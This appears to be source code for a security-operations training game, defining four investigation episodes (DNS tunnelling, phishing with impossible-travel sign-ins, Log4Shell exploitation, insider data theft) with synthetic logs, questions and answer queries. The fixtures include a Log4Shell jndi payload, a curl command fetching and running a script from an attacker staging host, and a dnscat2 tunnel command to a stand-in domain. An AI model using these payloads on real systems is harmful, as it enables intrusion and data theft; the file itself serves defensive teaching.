import { defineCasebook } from './casebook';
import { staffIn } from './world';
import { GLASS_HERON as GH } from './actors';

// ── Episode 7 · Whispers in the DNS ─────────────────────────────────────────────────────────────
const ep7Victim = staffIn('Logistics')[7];
const EP7_C2 = 'heron-analytics.example';

export const ep07 = defineCasebook({
  id: 'casebook-s1e07-whispers-in-dns',
  episode: 7,
  title: 'Whispers in the DNS',
  difficulty: 'Hard',
  replaces: 'siem-chronicle-dns-tunneling',
  inspiredBy: 'DNS tunnelling used to exfiltrate data past perimeter controls',
  date: '2026-10-12',
  briefing: 'A network engineer notices one laptop making thousands of DNS lookups for long, random-looking subdomains of a single parent domain. Nothing is blocked — DNS is allowed everywhere. Work out whether this is data leaving the company through DNS, how much, and where it is going.',
  chapters: [
    { id: 'signal', title: 'The strange lookups' },
    { id: 'confirm', title: 'Tunnel or noise?' },
    { id: 'scope', title: 'How much left' },
    { id: 'attribution', title: 'Who is listening' },
  ],
  inject(t, when) {
    const e = ep7Victim;
    // A long burst of encoded-subdomain lookups to one parent domain — the signature of DNS tunnelling.
    for (let i = 0; i < 480; i++) {
      const label = (i * 2654435761 >>> 0).toString(36).padStart(7, '0');
      const minute = 540 + Math.floor(i / 8);
      const hh = String(Math.floor(minute / 60)).padStart(2, '0');
      const mm = String(minute % 60).padStart(2, '0');
      const ss = String((i % 8) * 7).padStart(2, '0');
      t.add('DnsEvents', when(0, `${hh}:${mm}:${ss}`), { DeviceName: e.hostname, ClientIP: e.ip, QueryName: `${label}.${EP7_C2}`, QueryType: 'TXT', Answer: '', ResponseBytes: 180 + (i % 40) });
    }
    t.add('ProcessEvents', when(0, '08:59:40'), { DeviceName: e.hostname, AccountName: e.username, ProcessName: 'dnscat2.exe', ParentProcessName: 'explorer.exe', CommandLine: `dnscat2.exe --domain ${EP7_C2}`, SHA256: 'dnscat-tunnel' });
    t.add('ThreatIntel', when(0, '07:30:00'), { Indicator: EP7_C2, IndicatorType: 'domain', Actor: GH.name, Confidence: 'High', Source: 'Season 1 Episode 3 fleet hunt', Limitation: 'Internal correlation; infrastructure may rotate.' });
    t.add('ResponseActions', when(0, '12:10:00'), { IncidentId: 'IR-1012', Target: e.hostname, Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '12:12:00'), { IncidentId: 'IR-1012', Target: EP7_C2, Action: 'SinkholeDomain', Result: 'Success', ApprovedBy: 'soc-lead' });
  },
  questions: [
    { chapter: 'signal', prompt: `How many DNS lookups were made for subdomains of ${EP7_C2}?`, teach: 'DNS tunnelling hides data inside the subdomain part of a query. A normal host resolves a domain a handful of times; hundreds of lookups for unique subdomains of one parent is the first red flag. `contains` matches the parent domain across every encoded label.', query: `DnsEvents | where QueryName contains "${EP7_C2}" | count`, column: 'Count', hint: 'Count DnsEvents whose QueryName contains the parent domain.', type: 'number' },
    { chapter: 'signal', prompt: 'Which device made these lookups?', teach: 'Pivot to the source. One device generating this volume is either misconfigured software or an implant — the process list decides which.', query: `DnsEvents | where QueryName contains "${EP7_C2}" | distinct DeviceName`, column: 'DeviceName', hint: 'distinct DeviceName on the tunnelling lookups.' },
    { chapter: 'confirm', prompt: 'Which query record type did the tunnel use?', teach: 'TXT records can carry arbitrary text, which makes them a favourite channel for tunnelling data out. The query type is a strong indicator when combined with the volume.', query: `DnsEvents | where QueryName contains "${EP7_C2}" | distinct QueryType`, column: 'QueryType', hint: 'distinct QueryType on the same lookups.' },
    { chapter: 'confirm', prompt: 'Which process generated the DNS tunnel?', teach: 'A tunnelling tool is a running program. Endpoint process telemetry names it; the command line even shows the domain it was told to use. This turns a network anomaly into a confirmed intrusion.', query: `ProcessEvents | where DeviceName == "${ep7Victim.hostname}" and CommandLine contains "${EP7_C2}"`, column: 'ProcessName', hint: 'Search process command lines for the tunnel domain.' },
    { chapter: 'scope', prompt: 'How many bytes did the DNS answers return in total?', teach: 'Summing a numeric field estimates volume. DNS tunnelling is slow and noisy, but over thousands of queries it adds up. This figure informs whether a reportable amount of data could have left.', query: `DnsEvents | where QueryName contains "${EP7_C2}" | summarize sum(ResponseBytes)`, column: 'sum_ResponseBytes', hint: 'summarize sum(ResponseBytes) over the tunnelling lookups.', type: 'number' },
    { chapter: 'scope', prompt: 'How many distinct subdomains were requested?', teach: 'Each unique subdomain is a distinct chunk of smuggled data. Counting distinct names estimates how many data fragments were sent — a different measure from the raw query count, because tunnels retry.', query: `DnsEvents | where QueryName contains "${EP7_C2}" | summarize dcount(QueryName)`, column: 'dcount_QueryName', hint: 'summarize dcount(QueryName) on the lookups.', type: 'number' },
    { chapter: 'attribution', prompt: 'Which actor is linked to the tunnel domain?', teach: 'ThreatIntel ties the domain to a known actor — and the source shows it is the same crew from Episode 3. Recurring infrastructure connects separate incidents into one espionage campaign.', query: `ThreatIntel | where Indicator == "${EP7_C2}"`, column: 'Actor', hint: 'Look the domain up in ThreatIntel.' },
    { chapter: 'attribution', prompt: 'Which earlier episode does the intelligence cite?', teach: 'Internal intelligence — your own past incidents — is often the most relevant. Citing the source lets the next analyst verify the link rather than trust it blindly.', query: `ThreatIntel | where Indicator == "${EP7_C2}"`, column: 'Source', hint: 'Read the Source field on the intel record.' },
    { chapter: 'attribution', prompt: 'How was the domain contained? Enter the response action name.', teach: 'Sinkholing redirects a malicious domain to a controlled server, cutting the channel without waiting for every endpoint to be cleaned. Pair it with isolating the host.', query: `ResponseActions | where Target == "${EP7_C2}"`, column: 'Action', hint: 'Find the response action whose Target is the domain.' },
    { chapter: 'attribution', prompt: 'Which incident ID tracks the containment?', teach: 'One incident ID ties the host isolation and the domain sinkhole together, so the response can be reviewed as a whole.', query: `ResponseActions | where Action == "SinkholeDomain"`, column: 'IncidentId', hint: 'Read IncidentId on the sinkhole action.' },
  ],
});

// ── Episode 8 · Two Places at Once ──────────────────────────────────────────────────────────────
const ep8Victim = staffIn('Finance')[3];
const EP8_HOME = ep8Victim.homeIp;
const EP8_ATTACKER = '198.51.100.212';

export const ep08 = defineCasebook({
  id: 'casebook-s1e08-two-places-at-once',
  episode: 8,
  title: 'Two Places at Once',
  difficulty: 'Medium',
  replaces: 'siem-sentinel-impossible-travel',
  inspiredBy: 'impossible-travel sign-ins following credential phishing',
  date: '2026-10-19',
  briefing: 'An identity-protection alert fires: a finance employee signed in from Accra and, eleven minutes later, from another country. A person cannot travel that far that fast. Decide whether the account is compromised, how the attacker got in, and whether the response actually locked them out.',
  chapters: [
    { id: 'alert', title: 'The impossible trip' },
    { id: 'entry', title: 'How they got the password' },
    { id: 'actions', title: 'What they did next' },
    { id: 'response', title: 'Locking it down' },
  ],
  inject(t, when) {
    const v = ep8Victim;
    t.add('EmailEvents', when(0, '07:50:00'), { MessageId: 'GH-PAY-08', SenderAddress: `payroll-portal@${GH.domains.phish}`, RecipientAddress: v.email, Subject: 'Confirm your October payslip details', Url: `https://${GH.domains.phish}/payroll/login`, AttachmentName: '', DeliveryAction: 'Delivered', Verdict: 'Clean' });
    t.add('ProxyEvents', when(0, '08:14:10'), { DeviceName: v.hostname, UserPrincipalName: v.email, Url: `https://${GH.domains.phish}/payroll/login`, Domain: GH.domains.phish, DestinationIP: GH.ips.phish, Method: 'POST', StatusCode: 302, BytesSent: 1420, BytesReceived: 300, UserAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/128.0' });
    // Legitimate morning sign-in from home.
    t.add('SigninLogs', when(0, '08:20:00'), { UserPrincipalName: v.email, IPAddress: EP8_HOME, ResultType: 0, ResultDescription: 'Success', AppName: 'Halcyon Portal', DeviceName: v.hostname, Location: 'GH', MfaResult: 'Approved', SessionId: 'OK-SESS-08' });
    // Attacker sign-in from another country eleven minutes later.
    t.add('SigninLogs', when(0, '08:31:00'), { UserPrincipalName: v.email, IPAddress: EP8_ATTACKER, ResultType: 0, ResultDescription: 'Success', AppName: 'Halcyon Portal', DeviceName: 'unknown', Location: 'NL', MfaResult: 'Approved', SessionId: 'BAD-SESS-08' });
    t.add('SecurityAlerts', when(0, '08:32:00'), { AlertName: 'Impossible travel sign-in', Severity: 'High', DeviceName: '', Entity: v.email, Status: 'New', Product: 'Halcyon Identity Protection' });
    t.add('CloudAuditEvents', when(0, '08:35:00'), { UserPrincipalName: v.email, Operation: 'DownloadFile', Resource: 'Finance/Payroll-October.xlsx', IPAddress: EP8_ATTACKER, SessionId: 'BAD-SESS-08', Result: 'Success', ItemCount: 1 });
    t.add('CloudAuditEvents', when(0, '08:37:30'), { UserPrincipalName: v.email, Operation: 'New-InboxRule', Resource: 'Inbox', RuleName: 'payslip', ForwardTo: `collect@${GH.domains.staging}`, IPAddress: EP8_ATTACKER, SessionId: 'BAD-SESS-08', Result: 'Success', ItemCount: 0 });
    t.add('ResponseActions', when(0, '09:05:00'), { IncidentId: 'IR-1019', Target: v.email, Action: 'RevokeSessions', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '09:06:00'), { IncidentId: 'IR-1019', Target: v.email, Action: 'ForcePasswordReset', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '09:07:00'), { IncidentId: 'IR-1019', Target: v.email, Action: 'RemoveInboxRule', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('CloudAuditEvents', when(0, '09:40:00'), { UserPrincipalName: v.email, Operation: 'DownloadFile', Resource: 'Finance/Payroll-October.xlsx', IPAddress: EP8_ATTACKER, SessionId: 'BAD-SESS-08', Result: 'Denied', ItemCount: 0 });
  },
  questions: [
    { chapter: 'alert', prompt: `How many successful sign-ins did ${ep8Victim.email} have on this day?`, teach: 'Start by measuring the account. Both the legitimate and the suspicious sign-in succeeded — a successful sign-in from an unusual place is more serious than a failed one, because the attacker is already inside.', query: `SigninLogs | where UserPrincipalName == "${ep8Victim.email}" and ResultType == 0 | count`, column: 'Count', hint: 'Count successful (ResultType 0) sign-ins for the account.', type: 'number' },
    { chapter: 'alert', prompt: 'From which unfamiliar IP address did the second sign-in come?', teach: 'Compare the sign-in IPs against the employee record. One matches the home range; the other does not. The unfamiliar address, from a different country minutes apart, is the impossible-travel leg.', query: `SigninLogs | where UserPrincipalName == "${ep8Victim.email}" and Location == "NL"`, column: 'IPAddress', hint: 'Filter the account to the foreign Location.' },
    { chapter: 'alert', prompt: 'What session ID did that sign-in create?', teach: 'The session ID is the thread you pull to see everything the attacker did. Capture it from the suspicious sign-in and carry it into the cloud audit log.', query: `SigninLogs | where IPAddress == "${EP8_ATTACKER}"`, column: 'SessionId', hint: 'Read SessionId on the attacker sign-in.' },
    { chapter: 'entry', prompt: 'Which domain did the employee POST credentials to before the attack?', teach: 'A successful sign-in with correct credentials, but from a new place, usually means the password was phished. The proxy POST to a look-alike login page is where it was captured.', query: `ProxyEvents | where UserPrincipalName == "${ep8Victim.email}" and Method == "POST"`, column: 'Domain', hint: 'Find the employee POST in ProxyEvents.' },
    { chapter: 'entry', prompt: 'What was the subject of the phishing email?', teach: 'Pivot from the domain to the mail that delivered it. A payslip-confirmation pretext is timed to payroll season to feel routine.', query: `EmailEvents | where Url contains "${GH.domains.phish}"`, column: 'Subject', hint: 'Search EmailEvents for the phishing domain in the URL.' },
    { chapter: 'actions', prompt: 'Which file did the attacker download?', teach: 'Cloud audit events show what the session did. A payroll spreadsheet download from a finance account is likely data theft — note it for breach assessment.', query: `CloudAuditEvents | where SessionId == "BAD-SESS-08" and Operation == "DownloadFile" and Result == "Success"`, column: 'Resource', hint: 'Filter the attacker session to a successful DownloadFile.' },
    { chapter: 'actions', prompt: 'Where did the attacker set mail to forward to?', teach: 'Forwarding rules are persistence: even after a password reset, mail keeps leaking until the rule is removed. Always check for them during account recovery.', query: 'CloudAuditEvents | where SessionId == "BAD-SESS-08" and Operation == "New-InboxRule"', column: 'ForwardTo', hint: 'Find the New-InboxRule in the attacker session.' },
    { chapter: 'response', prompt: 'Which response action removed the attacker’s mailbox persistence?', teach: 'Revoking sessions and resetting the password do not delete a rule the attacker already created. A separate action must remove it.', query: `ResponseActions | where Target == "${ep8Victim.email}" and Action == "RemoveInboxRule"`, column: 'Action', hint: 'Look for the rule-removal response action.' },
    { chapter: 'response', prompt: 'What result was recorded when the attacker tried to download the file again after the response?', teach: 'Validate containment with evidence. After the session revocation, the same session attempting a download should be denied — proof this session is dead.', query: 'CloudAuditEvents | where SessionId == "BAD-SESS-08" and Result == "Denied"', column: 'Result', hint: 'Look at the attacker session’s later activity.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID groups the revoke, reset and rule-removal so the response reads as a single, reviewable action.', query: 'ResponseActions | where Action == "ForcePasswordReset"', column: 'IncidentId', hint: 'Read IncidentId on the password-reset action.' },
  ],
});

// ── Episode 9 · The Logging Library ─────────────────────────────────────────────────────────────
const EP9_ATTACKER = '203.0.113.150';
const EP9_SERVER = 'HF-APP-TRACK-01';
const EP9_LDAP = 'heron-ldap.example';

export const ep09 = defineCasebook({
  id: 'casebook-s1e09-logging-library',
  episode: 9,
  title: 'The Logging Library',
  difficulty: 'Hard',
  replaces: 'siem-qradar-log4shell-exploitation',
  inspiredBy: 'Log4Shell (CVE-2021-44228) exploitation of a public web application',
  date: '2026-10-26',
  briefing: 'Halcyon’s public shipment-tracking site started making outbound LDAP connections it has never made before. A vulnerability notice warns that the logging library it uses can be tricked into fetching and running remote code from a crafted string in any logged field. Establish whether the site was exploited, what ran, and whether the fix held.',
  chapters: [
    { id: 'recon', title: 'The probing requests' },
    { id: 'exploit', title: 'The callback' },
    { id: 'impact', title: 'What ran' },
    { id: 'recovery', title: 'Patch and verify' },
  ],
  inject(t, when) {
    // A scan of crafted User-Agent strings against the tracking site.
    for (let i = 0; i < 40; i++) {
      t.add('WebServerLogs', when(0, `10:${String(10 + i).padStart(2, '0')}:00`), { Site: 'track.halcyonfreight.example', ClientIP: EP9_ATTACKER, Method: 'GET', Url: `/track?shipment=HF${500000 + i}`, StatusCode: 200, UserAgent: `\${jndi:ldap://${EP9_LDAP}/a}`, BytesSent: 2200 });
    }
    t.add('NetworkEvents', when(0, '10:11:05'), { DeviceName: EP9_SERVER, InitiatingProcessFileName: 'java.exe', RemoteIP: GH.ips.staging, RemotePort: 389, RemoteUrl: EP9_LDAP, ActionType: 'ConnectionSuccess', BytesSent: 640 });
    t.add('DnsEvents', when(0, '10:11:04'), { DeviceName: EP9_SERVER, ClientIP: '10.40.200.40', QueryName: EP9_LDAP, QueryType: 'A', Answer: GH.ips.staging });
    t.add('ProcessEvents', when(0, '10:11:20'), { DeviceName: EP9_SERVER, AccountName: 'svc-track', ProcessName: 'curl.exe', ParentProcessName: 'java.exe', CommandLine: `curl.exe -s http://${GH.ips.staging}/stage.sh -o /tmp/stage.sh`, SHA256: 'curl-signed' });
    t.add('ProcessEvents', when(0, '10:11:28'), { DeviceName: EP9_SERVER, AccountName: 'svc-track', ProcessName: 'bash', ParentProcessName: 'java.exe', CommandLine: 'bash /tmp/stage.sh', SHA256: 'stage-dropper' });
    t.add('SecurityAlerts', when(0, '10:12:00'), { AlertName: 'Web server spawned a shell', Severity: 'High', DeviceName: EP9_SERVER, Entity: 'svc-track', Status: 'New', Product: 'Halcyon EDR' });
    t.add('ThreatIntel', when(0, '09:00:00'), { Indicator: EP9_LDAP, IndicatorType: 'domain', Actor: GH.name, Confidence: 'High', Source: 'Vendor vulnerability bulletin and internal correlation', Limitation: 'Exploitation of the library does not by itself prove which data was accessed.' });
    t.add('ResponseActions', when(0, '11:00:00'), { IncidentId: 'IR-1026', Target: EP9_SERVER, Action: 'ApplyPatch', Result: 'Success', PatchVersion: '2.17.1', ApprovedBy: 'app-owner' });
    t.add('ResponseActions', when(0, '11:05:00'), { IncidentId: 'IR-1026', Target: EP9_LDAP, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('WebServerLogs', when(0, '11:30:00'), { Site: 'track.halcyonfreight.example', ClientIP: EP9_ATTACKER, Method: 'GET', Url: '/track?shipment=HF777777', StatusCode: 200, UserAgent: `\${jndi:ldap://${EP9_LDAP}/a}`, BytesSent: 2200 });
  },
  questions: [
    { chapter: 'recon', prompt: 'How many requests carried a jndi exploit string in the User-Agent?', teach: 'The exploit hides a `${jndi:ldap://...}` string in a field the server logs. When the vulnerable logging library records it, it tries to fetch and run code from that URL. Count requests whose User-Agent contains the pattern.', query: 'WebServerLogs | where UserAgent contains "jndi" | count', column: 'Count', hint: 'Count WebServerLogs whose UserAgent contains "jndi".', type: 'number' },
    { chapter: 'recon', prompt: 'Which IP address sent the exploit requests?', teach: 'Identify the attacker address so you can block it and search for its other activity. A single source hammering one endpoint with crafted strings is a targeted exploit attempt.', query: 'WebServerLogs | where UserAgent contains "jndi" | distinct ClientIP', column: 'ClientIP', hint: 'distinct ClientIP on the exploit requests.' },
    { chapter: 'exploit', prompt: 'Which domain did the web server call out to over LDAP?', teach: 'Successful exploitation makes the server itself connect outbound to the attacker’s LDAP server (port 389) to fetch code. A web server making LDAP connections is deeply abnormal — that is the confirmation.', query: 'NetworkEvents | where DeviceName == "HF-APP-TRACK-01" and RemotePort == 389', column: 'RemoteUrl', hint: 'Find the port-389 connection from the server.' },
    { chapter: 'exploit', prompt: 'Which process on the server made that LDAP connection?', teach: 'The connection comes from the Java process running the vulnerable application — not a browser or a shell. This ties the network callback to the exploited service.', query: 'NetworkEvents | where DeviceName == "HF-APP-TRACK-01" and RemotePort == 389', column: 'InitiatingProcessFileName', hint: 'Read InitiatingProcessFileName on the LDAP connection.' },
    { chapter: 'impact', prompt: 'Which command downloaded the second stage?', teach: 'After the callback, the server fetches a script. Children of the Java process reaching the network are the hands-on-keyboard phase. The command line shows the staging URL and output path.', query: 'ProcessEvents | where DeviceName == "HF-APP-TRACK-01" and ProcessName == "curl.exe"', column: 'CommandLine', hint: 'Find curl.exe spawned by the app and read its command line.' },
    { chapter: 'impact', prompt: 'Under which service account did the shell run?', teach: 'Code runs with the web service’s privileges. Knowing the account tells you what the attacker could reach and which credentials to rotate.', query: 'ProcessEvents | where DeviceName == "HF-APP-TRACK-01" and ParentProcessName == "java.exe" and ProcessName == "bash"', column: 'AccountName', hint: 'Read AccountName on the bash process spawned by Java.' },
    { chapter: 'impact', prompt: 'Which actor is associated with the LDAP domain?', teach: 'ThreatIntel links the callback domain to a known actor and notes an important limitation: proving exploitation is not the same as proving what data was read. Keep that distinction in your report.', query: `ThreatIntel | where Indicator == "${EP9_LDAP}"`, column: 'Actor', hint: 'Look the LDAP domain up in ThreatIntel.' },
    { chapter: 'recovery', prompt: 'Which patched version was deployed?', teach: 'The durable fix is upgrading the logging library to a version that disables the dangerous lookup. Record the version so the fix can be audited across the fleet.', query: 'ResponseActions | where Action == "ApplyPatch"', column: 'PatchVersion', hint: 'Read PatchVersion on the ApplyPatch action.' },
    { chapter: 'recovery', prompt: 'Which incident ID tracks the recovery?', teach: 'Patching and blocking the indicator belong to one incident, so the response can be reviewed and closed together.', query: 'ResponseActions | where Action == "BlockIndicator" and Target == "heron-ldap.example"', column: 'IncidentId', hint: 'Read IncidentId on the block action for the LDAP domain.' },
    { chapter: 'recovery', prompt: 'How many exploit requests arrived in total, including after the patch? Confirm the attacker kept trying.', teach: 'Attackers keep scanning long after you patch. A later request with the same payload, now harmless against the fixed server, shows why monitoring must continue even after remediation.', query: 'WebServerLogs | where UserAgent contains "jndi" | count', column: 'Count', hint: 'Count all jndi requests across the whole window.', type: 'number' },
  ],
});

// ── Episode 10 · The Long Goodbye ───────────────────────────────────────────────────────────────
const ep10Insider = staffIn('Sales')[6];
const EP10_USB = 'E:\\';

export const ep10 = defineCasebook({
  id: 'casebook-s1e10-long-goodbye',
  episode: 10,
  title: 'The Long Goodbye',
  difficulty: 'Medium',
  replaces: 'siem-qradar-insider-data-theft',
  inspiredBy: 'departing-employee data theft before resignation',
  date: '2026-11-02',
  briefing: 'An account executive handed in their notice last week. HR flags that, in their final days, they accessed far more customer records than usual. This is not an outside attacker — it is a trusted insider. Establish what they took, how, and whether policy was actually enforced on the way out.',
  chapters: [
    { id: 'baseline', title: 'What is normal' },
    { id: 'access', title: 'The bulk download' },
    { id: 'removal', title: 'Getting it out' },
    { id: 'response', title: 'Offboarding' },
  ],
  inject(t, when) {
    const e = ep10Insider;
    // A burst of CRM record exports far above this person's normal rate.
    for (let i = 0; i < 60; i++) {
      t.add('CloudAuditEvents', when(0, `${String(14 + Math.floor(i / 20)).padStart(2, '0')}:${String((i % 20) * 3).padStart(2, '0')}:00`), { UserPrincipalName: e.email, Operation: 'ExportRecords', Resource: 'CRM/Customers', IPAddress: e.ip, SessionId: 'CRM-INS-10', Result: 'Success', ItemCount: 500 + i * 10 });
    }
    t.add('FileEvents', when(0, '16:40:00'), { DeviceName: e.hostname, AccountName: e.username, ActionType: 'FileCreated', FileName: 'customers-full-export.csv', FolderPath: `C:\\Users\\${e.username}\\Documents`, SizeBytes: 48_200_000, SHA256: 'crm-export-csv' });
    t.add('FileEvents', when(0, '16:52:00'), { DeviceName: e.hostname, AccountName: e.username, ActionType: 'FileCopied', FileName: 'customers-full-export.csv', FolderPath: EP10_USB, SizeBytes: 48_200_000, DestinationDevice: 'USB-STOR', SHA256: 'crm-export-csv' });
    t.add('SecurityAlerts', when(0, '16:53:00'), { AlertName: 'Large file copied to removable media', Severity: 'Medium', DeviceName: e.hostname, Entity: e.email, Status: 'New', Product: 'Halcyon DLP' });
    t.add('Employees', when(0, '08:00:01'), { name: e.name, username: e.username, email_addr: e.email, department: e.department, role: e.role, hostname: e.hostname, ip_addr: e.ip, hire_date: e.hireDate, status: 'Notice period', leaving_date: '2026-11-06' });
    t.add('ResponseActions', when(0, '18:00:00'), { IncidentId: 'IR-1102', Target: e.email, Action: 'DisableAccount', Result: 'Success', ApprovedBy: 'hr-partner' });
    t.add('ResponseActions', when(0, '18:05:00'), { IncidentId: 'IR-1102', Target: e.hostname, Action: 'PreserveForensicImage', Result: 'Success', ApprovedBy: 'legal' });
    t.add('ResponseActions', when(0, '18:10:00'), { IncidentId: 'IR-1102', Target: e.email, Action: 'RevokeDataAccess', Result: 'Success', ApprovedBy: 'hr-partner' });
  },
  questions: [
    { chapter: 'baseline', prompt: `Which department does ${ep10Insider.name} work in?`, teach: 'Insider cases begin with context, not suspicion. The employee record gives department, role and — importantly — their leaving date. A departing employee with broad data access is a known elevated risk, not proof of wrongdoing on its own.', query: `Employees | where name == "${ep10Insider.name}" and status == "Notice period"`, column: 'department', hint: 'Look the person up in Employees; filter to their notice-period record.' },
    { chapter: 'baseline', prompt: `What is ${ep10Insider.name.split(' ')[0]}'s recorded leaving date?`, teach: 'The leaving date frames the timeline: activity spiking in the final days is the pattern HR flagged. Context from HR and from the logs must agree before you draw a conclusion.', query: `Employees | where name == "${ep10Insider.name}" and leaving_date != ""`, column: 'leaving_date', hint: 'Read the leaving_date on the notice-period record.' },
    { chapter: 'access', prompt: 'How many CRM export operations did the account perform?', teach: 'Measure the activity against what is normal for the role. Dozens of exports in an afternoon, from someone who normally views a few records, is the quantitative signal of bulk collection.', query: `CloudAuditEvents | where UserPrincipalName == "${ep10Insider.email}" and Operation == "ExportRecords" | count`, column: 'Count', hint: 'Count ExportRecords operations for the account.', type: 'number' },
    { chapter: 'access', prompt: 'How many customer records were exported in total?', teach: 'Summing the records exported estimates the scale of the potential loss — the number that matters for customer notification and legal assessment.', query: `CloudAuditEvents | where UserPrincipalName == "${ep10Insider.email}" and Operation == "ExportRecords" | summarize sum(ItemCount)`, column: 'sum_ItemCount', hint: 'summarize sum(ItemCount) over the exports.', type: 'number' },
    { chapter: 'removal', prompt: 'What file did the insider create on their laptop?', teach: 'Cloud exports land as a file on the endpoint. A single large CSV of customer data in the user’s Documents folder is the staged copy before removal.', query: `FileEvents | where DeviceName == "${ep10Insider.hostname}" and ActionType == "FileCreated" and SizeBytes > 1000000`, column: 'FileName', hint: 'Find the unusually large FileCreated event on the device (over a megabyte).' },
    { chapter: 'removal', prompt: 'To which removable drive letter was the file copied?', teach: 'Exfiltration here is physical: a copy to a USB drive. FileCopied events to removable media are exactly what data-loss prevention watches for, and the destination tells you what to recover.', query: `FileEvents | where DeviceName == "${ep10Insider.hostname}" and ActionType == "FileCopied"`, column: 'FolderPath', hint: 'Read the destination FolderPath on the FileCopied event.' },
    { chapter: 'removal', prompt: 'Which DLP alert fired on the copy?', teach: 'The data-loss prevention tool raised a medium-severity alert on the removable-media copy. Here it fired correctly — the failure in many real cases is that nobody reads it in time.', query: `SecurityAlerts | where Entity == "${ep10Insider.email}" and Product == "Halcyon DLP"`, column: 'AlertName', hint: 'Find the DLP alert for the insider.' },
    { chapter: 'response', prompt: 'Which response action disabled the account?', teach: 'Offboarding a confirmed insider starts with cutting access. Disabling the account stops further collection while the investigation continues.', query: `ResponseActions | where Target == "${ep10Insider.email}" and Action == "DisableAccount"`, column: 'Action', hint: 'Find the account-disable response action.' },
    { chapter: 'response', prompt: 'Which action preserved evidence for a possible legal case?', teach: 'Insider cases often become legal matters. Imaging the device before it is wiped preserves the evidence chain — a step driven by legal, not just security.', query: `ResponseActions | where Target == "${ep10Insider.hostname}"`, column: 'Action', hint: 'Find the response action whose target is the device.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the offboarding response?', teach: 'Disabling the account, preserving the image and revoking data access are one coordinated response under a single incident ID.', query: 'ResponseActions | where Action == "RevokeDataAccess"', column: 'IncidentId', hint: 'Read IncidentId on the data-access revocation.' },
  ],
});
